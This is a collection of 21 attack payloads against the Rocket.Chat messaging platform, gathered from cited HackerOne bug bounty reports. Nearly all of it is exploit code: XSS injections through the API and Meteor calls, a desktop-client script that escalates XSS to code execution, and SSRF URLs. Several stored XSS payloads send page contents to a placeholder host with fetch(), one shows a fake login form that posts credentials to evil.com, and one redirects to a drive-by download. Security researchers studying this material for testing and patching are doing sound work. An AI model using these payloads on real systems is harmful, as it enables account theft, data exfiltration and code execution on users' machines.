# Rocket.Chat

21 payloads.

### `4626c5f6`

```
# Login to get Auth Token and User Id
curl http://127.0.0.1:3000/api/v1/login -d "username=<USER_NAME>&password=<PASSWORD>"

# Send crafted message
curl -H "X-Auth-Token: <USER_TOKEN>" -H "X-User-Id: <USER_ID>" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!"
```

**Parameter:** `attachments[0][fields][0][value]`
— [XSS via /api/v1/chat.postMessage ](https://hackerone.com/reports/219957) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `98abfe3a`

```
[ hax ](http://hax//onmouseover=location='https://target.com/hax/rocket/hack.html';"`hax`zzz)
```

— [Remote Code Execution in Rocket.Chat Desktop](https://hackerone.com/reports/276031) · Rocket.Chat · [mattaustin](https://hackerone.com/mattaustin)

### `c26bc479`

```
<html><head>
        <meta id="meta-viewport" name="viewport" content="width=412" contenteditable="false">
        <style>
            .mail-message-content pre {
                white-space: pre-wrap !important;
            }

            .initial-load {
                /* 0x0 and 1x1 may be short-circuited by WebView */
                width: 2px;
                height: 0px;
                -webkit-transform: translate3d(0, 0, 1px);
                -webkit-animation-name: initial-load-noop-an
```

— [Blind XSS in the rocket.chat registration email](https://hackerone.com/reports/382666) · Rocket.Chat · [edoverflow](https://hackerone.com/edoverflow)

### `a0a97f3e`

```
<img src=0 onerror="alert(0)"/>
```

**Parameter:** `home_body`
— [XSS (leads to arbitrary file read in Rocket.Chat-Desktop)](https://hackerone.com/reports/724153) · Rocket.Chat · [sectex](https://hackerone.com/sectex)

### `e6a23000`

```
(function() {
    const payload = `file:///System/Applications/Calculator.app`;
    var counter = 0;
    var target = document.createElement(`a`);
    target.setAttribute(`href`, payload);
    document.body.appendChild(target);
    var old_test = RegExp.prototype.test;
    RegExp.prototype.test = function (s) {
        if (s === payload) {
            return (++counter > 3);
        }
        return old_test.call(this, s);
    };
    target.dispatchEvent(new Event(`click`));
})();
```

— [XSS leads to RCE on the RocketChat desktop client.](https://hackerone.com/reports/899964) · Rocket.Chat · [fabianfreyer](https://hackerone.com/fabianfreyer)

### `c10d6510`

```
<html dir="ltr"><head><meta charset="utf-8"><title>Rocket.Chat.Livechat</title><meta
name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet"
type="text/css" href="/livechat/61.chunk.a8a84.css"><script charset="utf-8"
src="/livechat/61.chunk.6a8fa.js"></script><link rel="stylesheet" type="text/css"
href="/livechat/62.chunk.e3920.css"><script charset="utf-8"
src="/livechat/62.chunk.39808.js"></script><script charset="utf-8"
src="/livechat/i18n.en.chunk.2a3c0.js"></scrip
```

— [Blind XSS](https://hackerone.com/reports/1091118) · Rocket.Chat · [abhinav-porwal](https://hackerone.com/abhinav-porwal)

### `ad750c57`

```
Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
```

**Parameter:** `name`
— [Post-Auth Stored XSS with User Interaction leads to Remote Code Execution](https://hackerone.com/reports/1132202) · Rocket.Chat · [sonarsource](https://hackerone.com/sonarsource)

### `415cf430`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "message_snippeted",
  snippetId: "\"><img src=x onerror=alert(1) style=\"display: none;\" x=\"",
  snippetName: ""
}, (...args) => console.log(...args));
```

**Parameter:** `snippetId`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `5c5cd10b`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "subscription-role-removed",
  role: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

**Parameter:** `role`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `fb5977f3`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "livechat_transfer_history",
  transferData: {
    scope: "agent",
    transferredTo: {
      name: "<img src=x onerror=alert(1) />"
    }
  }
}, (...args) => console.log(...args));
```

**Parameter:** `name`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `15ff1246`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "omnichannel_placed_chat_on_hold",
  comment: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

**Parameter:** `comment`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `3e336886`

```
http://192.168.100.9:8080.
```

— [SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function](https://hackerone.com/reports/3383079) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `a0a3f003`

```
http://192.168.100.9:8080
```

— [SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function](https://hackerone.com/reports/3383079) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `a0192436`

```
http://192.168.100.9:8080,
```

— [SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function](https://hackerone.com/reports/3383079) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `7f37be92`

```
http://192.168.100.14
```

— [SSRF via improper validation after DNS name resolution in the link-preview feature](https://hackerone.com/reports/3393664) · Rocket.Chat · [button142857](https://hackerone.com/button142857)

### `459e8e30`

```
curl -X POST http://TARGET:3000/api/v1/livechat/message \
  -H 'Content-Type: application/json' \
  -d '{
    "token":"poc-token-001",
    "rid":"ROOM_ID",
    "msg":"<img src=x onerror=\"fetch(\\\"https://target.com/exfil?d=\\\"+btoa(document.body.innerText))\">"
  }'
```

**Parameter:** `msg`
— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `ed84ed9d`

```
<p><strong>guest-2</strong> (Wed, 03 Jun 2026 13:23:22 GMT):<br/>
<img src=x onerror="fetch(\"https://target.com/exfil?d=\"+btoa(document.body.innerText))">
</p>
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `e0183b77`

```
<img src=x onerror="fetch('https://target.com/exfil',{method:'POST',body:btoa(document.body.innerText)})">
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `744c614b`

```
<img src=x onerror="
  document.body.innerHTML='<div style=\'font-family:sans-serif;max-width:400px;margin:80px auto;padding:40px;border:1px solid #ddd;border-radius:8px\'>'
    +'<img src=https://target.com/images/logo/logo-dark.svg width=200 style=margin-bottom:20px>'
    +'<h3>Session Expired</h3>'
    +'<p style=color:#666>Your session has expired. Please sign in again to view this export.</p>'
    +'<form action=https://evil.com/creds method=POST>'
    +'<input name=user placeholde
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `6b8ccc44`

```
<img src=x onerror="location='https://target.com/drive-by-download'">
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `07a7df4f`

```
<img onerror>
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)
